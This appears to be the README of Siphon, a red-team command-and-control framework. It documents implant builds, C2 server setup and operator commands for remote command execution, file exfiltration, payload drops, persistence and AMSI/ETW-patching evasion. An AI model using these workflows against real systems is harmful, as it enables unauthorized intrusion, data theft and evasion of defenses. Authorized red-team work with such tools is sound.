<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Siphon/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Siphon/main/docs/assets/logo-light.svg">
  <img alt="Siphon" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Siphon/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Go](https://img.shields.io/badge/language-Go-00ADD8.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**Lightweight C2 framework for red team operations**

HTTPS beacon transport with per-session forward secrecy via ECDH P-256, AES-256-GCM authenticated encryption, and uTLS Chrome fingerprinting. Server public key embedded at build time — zero config files on disk.

> **Authorization Required**: This tool is designed exclusively for authorized red team engagements with explicit written permission. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

[Quick Start](#quick-start) • [Usage](#usage) • [Command Reference](#command-reference) • [Architecture](#architecture) • [Security](#security)

</div>

---

## Highlights

<table>
<tr>
<td width="50%">

**Forward Secrecy**
Ephemeral ECDH P-256 key exchange per session. Server public key embedded at build time via ldflags — no config files on disk. Shared secrets zeroed after derivation.

**Encrypted Transport**
AES-256-GCM authenticated encryption with HMAC-SHA256 message authentication covering all envelope fields (ID, PubKey, Nonce, Ciphertext).

**TLS Fingerprinting**
uTLS with Chrome JA3 fingerprint (HelloChrome_Auto). Cookie-based beacon transport blends with normal HTTPS traffic on standard endpoints.

**Encrypted Loot**
Exfiltrated files encrypted at rest with AES-256-GCM in the `loot/` directory. 512 KB upload chunks. Path traversal protection via `filepath.Base()` on all implant-controlled identifiers.

</td>
<td width="50%">

**Runtime Evasion**
ETW and AMSI patching on startup (`ntdll!EtwEventWrite`, `amsi!AmsiScanBuffer`). PPID spoofing under `explorer.exe`. `CREATE_NO_WINDOW` for stealth process creation.

**Persistence**
Registry run keys (`HKCU\...\Run`), scheduled tasks (`schtasks`), and startup folder shortcuts. All methods include cleanup via `unpersist` commands.

**Resource Limits**
Max 1000 implants, 1000 results per implant, 512 KB upload chunks, 24h max sleep. Input limits: 64 KB cookie, 1 MB response, 10 MB submit body.

**Operator Console**
Interactive CLI with Catppuccin Mocha palette. Prefix-match implant selection, task queuing, and live result display. Beacon resilience with exponential backoff and cryptographic jitter.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

<table>
<tr>
<th>Requirement</th>
<th>Version</th>
<th>Purpose</th>
</tr>
<tr>
<td>Go</td>
<td>1.24.9+</td>
<td>Compiler toolchain</td>
</tr>
<tr>
<td>Make</td>
<td>any</td>
<td>Build automation</td>
</tr>
</table>

### Build

```bash
# Clone repository
git clone https://github.com/Real-Fruit-Snacks/Siphon.git
cd Siphon

# Generate ECDH keypair and self-signed TLS certificate
make setup

# Build the C2 server (stripped Linux binary)
make server

# Build the implant (Windows cross-compiled)
make implant SERVER_PK=<hex> C2_HOST=https://your-c2:443 SLEEP_SEC=10

# Verify
./build/siphon-server --help
```

### Verification

```bash
# Run all tests with race detector
go test ./... -v -race

# Lint
go vet ./...
staticcheck ./...
```

---

## Usage

### Start the Server

```bash
./build/siphon-server \
  -listen :443 \
  -cert server/certs/server.crt \
  -key server/certs/server.key \
  -auth secret-token
```

### Build and Deploy an Implant

```bash
# Windows implant (production)
make implant SERVER_PK=<hex> C2_HOST=https://10.0.0.5:443 SLEEP_SEC=10 AUTH_TOKEN=secret

# Linux implant (testing)
make implant-linux SERVER_PK=<hex>
```

### Interact with an Implant

```bash
siphon> implants                       # list checked-in implants
siphon> interact abc123                # select by prefix match
siphon(abc123)> cmd whoami             # execute a command
siphon(abc123)> upload C:\secrets.db   # exfiltrate a file
siphon(abc123)> download payload.exe C:\Windows\Temp\svc.exe
siphon(abc123)> sleep 30               # change beacon interval
siphon(abc123)> persist registry       # install persistence
siphon(abc123)> selfdestruct           # remove the implant
```

---

## Command Reference

### Server Flags

<table>
<tr>
<th>Flag</th>
<th>Default</th>
<th>Description</th>
</tr>
<tr><td><code>-listen</code></td><td><code>:443</code></td><td>Listen address</td></tr>
<tr><td><code>-cert</code></td><td><code>server/certs/server.crt</code></td><td>TLS certificate path</td></tr>
<tr><td><code>-key</code></td><td><code>server/certs/server.key</code></td><td>TLS private key path</td></tr>
<tr><td><code>-serverkey</code></td><td><code>server/certs/server.pem</code></td><td>ECDH server key path</td></tr>
<tr><td><code>-beacon-path</code></td><td><code>/api/news</code></td><td>Beacon endpoint URL path</td></tr>
<tr><td><code>-submit-path</code></td><td><code>/api/submit</code></td><td>Submit endpoint URL path</td></tr>
<tr><td><code>-auth</code></td><td>(none)</td><td>Pre-shared HMAC auth token</td></tr>
<tr><td><code>-genkey</code></td><td>—</td><td>Generate ECDH keypair and exit</td></tr>
<tr><td><code>-gencert</code></td><td>—</td><td>Generate self-signed TLS cert and exit</td></tr>
</table>

### Build Variables

<table>
<tr>
<th>Variable</th>
<th>Required</th>
<th>Default</th>
<th>Description</th>
</tr>
<tr><td><code>SERVER_PK</code></td><td>Yes</td><td>—</td><td>Server ECDH public key (hex)</td></tr>
<tr><td><code>C2_HOST</code></td><td>No</td><td><code>https://127.0.0.1:443</code></td><td>C2 server URL</td></tr>
<tr><td><code>SLEEP_SEC</code></td><td>No</td><td><code>5</code></td><td>Beacon interval in seconds</td></tr>
<tr><td><code>AUTH_TOKEN</code></td><td>No</td><td>—</td><td>Pre-shared HMAC authentication token</td></tr>
<tr><td><code>USER_AGENT</code></td><td>No</td><td>—</td><td>Custom User-Agent header</td></tr>
<tr><td><code>BEACON_URL</code></td><td>No</td><td>—</td><td>Custom beacon endpoint path</td></tr>
<tr><td><code>SUBMIT_URL</code></td><td>No</td><td>—</td><td>Custom submit endpoint path</td></tr>
<tr><td><code>KILL_DATE</code></td><td>No</td><td>—</td><td>Implant expiration date</td></tr>
<tr><td><code>DEBUG</code></td><td>No</td><td>—</td><td>Set to <code>true</code> to enable implant logging</td></tr>
</table>

### Operator Commands

<table>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
<tr><td><code>implants</code></td><td>List all checked-in implants</td></tr>
<tr><td><code>interact &lt;id&gt;</code></td><td>Select an implant (prefix match)</td></tr>
<tr><td><code>cmd &lt;command&gt;</code></td><td>Execute a shell command on the active implant</td></tr>
<tr><td><code>upload &lt;remote_path&gt;</code></td><td>Exfiltrate a file from implant to server</td></tr>
<tr><td><code>download &lt;local&gt; &lt;remote&gt;</code></td><td>Push a file from server to implant</td></tr>
<tr><td><code>sleep &lt;seconds&gt;</code></td><td>Adjust beacon interval (max 24h)</td></tr>
<tr><td><code>persist &lt;method&gt; [name]</code></td><td>Install persistence (registry, schtask, startup)</td></tr>
<tr><td><code>unpersist &lt;method&gt; [name]</code></td><td>Remove persistence</td></tr>
<tr><td><code>selfdestruct</code></td><td>Rename and delete the implant binary</td></tr>
<tr><td><code>exit-implant</code></td><td>Instruct the implant process to exit</td></tr>
<tr><td><code>back</code></td><td>Return to the main menu</td></tr>
<tr><td><code>tasks</code></td><td>Show queued tasks for the active implant</td></tr>
<tr><td><code>results</code></td><td>Show task results for the active implant</td></tr>
<tr><td><code>help</code></td><td>Print command reference</td></tr>
<tr><td><code>exit</code></td><td>Exit the operator console</td></tr>
</table>

---

## Architecture

```
shared/types.go              Protocol types: Beacon, Task, TaskResult, Envelope

implant/
  main.go                    Entry point with exponential backoff and jitter
  config.go                  Build-time config (c2Host, sleepSec, serverPK via ldflags)
  comms.go                   ECDH key exchange and AES-256-GCM encryption
  transport.go               HTTPS client: CheckIn, SendResult, InitImplant
  tasks.go                   Task dispatcher: cmd, upload, download, sleep, persist,
                             selfdestruct, exit
  evasion_windows.go         PPID spoofing under explorer.exe, CREATE_NO_WINDOW
  evasion_other.go           Non-Windows fallbacks (/bin/sh execution)
  patches_windows.go         ETW and AMSI patching (runtime evasion)
  patches_other.go           ETW/AMSI stubs for non-Windows builds
  persist_windows.go         Persistence: registry run key, scheduled task, startup folder
  persist_other.go           Non-Windows stubs

server/
  crypto.go                  ECDH key exchange and AES-256-GCM; keypair management
  handlers.go                HTTP handlers for beacon and submit; implant tracking
  cli.go                     Interactive operator console (Catppuccin Mocha palette)
  cmd/main.go                Server entry point; TLS certificate generation
  server_test.go             Integration tests: ECDH, AES-GCM, Envelope, full HTTP flow

Makefile                     Build system: setup, server, implant, implant-linux, clean
```

### Data Flow

```
Implant  ──  HTTPS GET /api/news (beacon)  ──▶  Server  ──▶  Task Queue
Implant  ◀──  Encrypted Task (AES-256-GCM)  ◀──  Server
Implant  ──  HTTPS POST /api/submit (result) ──▶  Server  ──▶  Loot Storage
```

### Encryption Flow

```
1. Implant generates ephemeral ECDH P-256 keypair
2. Derives shared secret using server's embedded public key
3. Shared secret → AES-256-GCM key
4. All payloads encrypted with unique nonce per message
5. HMAC-SHA256 covers envelope: ID + PubKey + Nonce + Ciphertext
6. Shared secret zeroed after key derivation
```

---

## Configuration

### Build Targets

```bash
make setup          # Generate ECDH keypair + TLS certificate
make server         # Build C2 server (Linux amd64, stripped)
make implant        # Build implant (Windows amd64, cross-compiled)
make implant-linux  # Build implant (Linux amd64, for testing)
make all            # Build server + implant
make clean          # Remove build artifacts and generated keys
```

### Exit Codes

<table>
<tr>
<th>Code</th>
<th>Meaning</th>
</tr>
<tr><td><code>0</code></td><td>Success / clean exit</td></tr>
<tr><td><code>1</code></td><td>General error / missing configuration</td></tr>
</table>

---

## Platform Support

<table>
<tr>
<th>Capability</th>
<th>Linux (Server)</th>
<th>Windows (Implant)</th>
<th>Linux (Implant)</th>
</tr>
<tr>
<td>HTTPS Beacon</td>
<td>Full</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>ECDH + AES-GCM</td>
<td>Full</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>uTLS Fingerprint</td>
<td>N/A</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>Command Execution</td>
<td>N/A</td>
<td><code>cmd.exe</code> + PPID spoof</td>
<td><code>/bin/sh</code></td>
</tr>
<tr>
<td>File Upload</td>
<td>Receives + encrypts</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>File Download</td>
<td>Serves files</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>ETW Patching</td>
<td>N/A</td>
<td>Full</td>
<td>Stub</td>
</tr>
<tr>
<td>AMSI Patching</td>
<td>N/A</td>
<td>Full</td>
<td>Stub</td>
</tr>
<tr>
<td>PPID Spoofing</td>
<td>N/A</td>
<td>Full (explorer.exe)</td>
<td>Not supported</td>
</tr>
<tr>
<td>Registry Persist</td>
<td>N/A</td>
<td>Full</td>
<td>Stub</td>
</tr>
<tr>
<td>Schtask Persist</td>
<td>N/A</td>
<td>Full</td>
<td>Stub</td>
</tr>
<tr>
<td>Startup Persist</td>
<td>N/A</td>
<td>Full</td>
<td>Stub</td>
</tr>
<tr>
<td>Self-Destruct</td>
<td>N/A</td>
<td>Full</td>
<td>Stub</td>
</tr>
</table>

---

## Security

### Vulnerability Reporting

**Report security issues via:**
- GitHub Security Advisories (preferred)
- Private disclosure to maintainers
- Responsible disclosure timeline (90 days)

**Do NOT:**
- Open public GitHub issues for vulnerabilities
- Disclose before coordination with maintainers
- Exploit vulnerabilities in unauthorized contexts

### Threat Model

**In scope:**
- Encrypted C2 communications resistant to passive interception
- TLS fingerprint blending with legitimate Chrome traffic
- Runtime evasion of userland security hooks (ETW, AMSI)
- Process ancestry spoofing to blend with normal system activity

**Out of scope:**
- Evading kernel-level EDR/XDR with in-depth behavioral analysis
- Anti-forensics or evidence destruction
- Defeating network-level TLS inspection proxies
- Long-term persistence survivable across full forensic investigation

### Security Properties

| Property | Implementation |
|----------|---------------|
| Forward secrecy | Ephemeral ECDH P-256 per session |
| Payload confidentiality | AES-256-GCM authenticated encryption |
| Key distribution | Server public key embedded at build time via ldflags |
| HMAC authentication | HMAC-SHA256 pre-shared token covering ID, PubKey, Nonce, Ciphertext |
| Loot encryption | Exfiltrated files encrypted at rest with AES-256-GCM |
| Path traversal protection | `filepath.Base()` sanitization on implant-controlled IDs |
| Memory safety | Deep-copied session keys; ECDH shared secrets zeroed after use |
| TLS fingerprinting | uTLS with Chrome JA3 fingerprint (HelloChrome_Auto) |
| Binary hardening | Stripped with `-s -w -trimpath`; no debug symbols or paths |
| Concurrency safety | `sync.RWMutex` and atomic operations throughout |
| Input limits | 64 KB cookie, 1 MB response, 10 MB submit body |
| File permissions | `0600` for all sensitive outputs |

### What Siphon Does NOT Do

Siphon is a **lightweight C2 framework**, not a full red team platform:

- **Not a post-exploitation suite** — No credential harvesting, lateral movement, or privilege escalation modules
- **Not kernel-level** — Evasion is userland only (ETW/AMSI patching, PPID spoofing)
- **Not anti-forensics** — Does not destroy event logs or tamper with disk artifacts
- **Not a payload generator** — No shellcode, no loaders, no polymorphic output

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Server won't start | Check cert/key paths: `-cert` and `-key` flags |
| Implant won't connect | Verify `C2_HOST` matches server address and port |
| HMAC verification fails | Ensure `AUTH_TOKEN` matches between server `-auth` and implant build |
| HTTP/2 mismatch | Server disables HTTP/2 automatically via `TLSNextProto` |
| Startup persist fails | Directory is auto-created via `MkdirAll` |
| schtask Access Denied | Scheduled tasks with `/rl HIGHEST` require admin |

---

## License

MIT License

Copyright &copy; 2026 Real-Fruit-Snacks

```
THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND.
THE AUTHORS ARE NOT LIABLE FOR ANY DAMAGES ARISING FROM USE.
USE AT YOUR OWN RISK AND ONLY WITH PROPER AUTHORIZATION.
```

---

## Resources

- **GitHub**: [github.com/Real-Fruit-Snacks/Siphon](https://github.com/Real-Fruit-Snacks/Siphon)
- **Releases**: [Latest Release](https://github.com/Real-Fruit-Snacks/Siphon/releases/latest)
- **Issues**: [Report a Bug](https://github.com/Real-Fruit-Snacks/Siphon/issues)
- **Security**: [SECURITY.md](SECURITY.md)
- **Contributing**: [CONTRIBUTING.md](CONTRIBUTING.md)
- **Changelog**: [CHANGELOG.md](CHANGELOG.md)

---

<div align="center">

**Part of the Real-Fruit-Snacks water-themed security toolkit**

[Aquifer](https://github.com/Real-Fruit-Snacks/Aquifer) • [Cascade](https://github.com/Real-Fruit-Snacks/Cascade) • [Conduit](https://github.com/Real-Fruit-Snacks/Conduit) • [Deadwater](https://github.com/Real-Fruit-Snacks/Deadwater) • [Deluge](https://github.com/Real-Fruit-Snacks/Deluge) • [Depth](https://github.com/Real-Fruit-Snacks/Depth) • [Dew](https://github.com/Real-Fruit-Snacks/Dew) • [Droplet](https://github.com/Real-Fruit-Snacks/Droplet) • [Fathom](https://github.com/Real-Fruit-Snacks/Fathom) • [Flux](https://github.com/Real-Fruit-Snacks/Flux) • [Grotto](https://github.com/Real-Fruit-Snacks/Grotto) • [HydroShot](https://github.com/Real-Fruit-Snacks/HydroShot) • [Maelstrom](https://github.com/Real-Fruit-Snacks/Maelstrom) • [Rapids](https://github.com/Real-Fruit-Snacks/Rapids) • [Ripple](https://github.com/Real-Fruit-Snacks/Ripple) • [Riptide](https://github.com/Real-Fruit-Snacks/Riptide) • [Runoff](https://github.com/Real-Fruit-Snacks/Runoff) • [Seep](https://github.com/Real-Fruit-Snacks/Seep) • [Shallows](https://github.com/Real-Fruit-Snacks/Shallows) • [Siphon](https://github.com/Real-Fruit-Snacks/Siphon) • [Slipstream](https://github.com/Real-Fruit-Snacks/Slipstream) • [Spillway](https://github.com/Real-Fruit-Snacks/Spillway) • [Surge](https://github.com/Real-Fruit-Snacks/Surge) • [Tidemark](https://github.com/Real-Fruit-Snacks/Tidemark) • [Tidepool](https://github.com/Real-Fruit-Snacks/Tidepool) • [Undercurrent](https://github.com/Real-Fruit-Snacks/Undercurrent) • [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) • [Vapor](https://github.com/Real-Fruit-Snacks/Vapor) • [Wellspring](https://github.com/Real-Fruit-Snacks/Wellspring) • [Whirlpool](https://github.com/Real-Fruit-Snacks/Whirlpool)

*Remember: With great power comes great responsibility.*

</div>
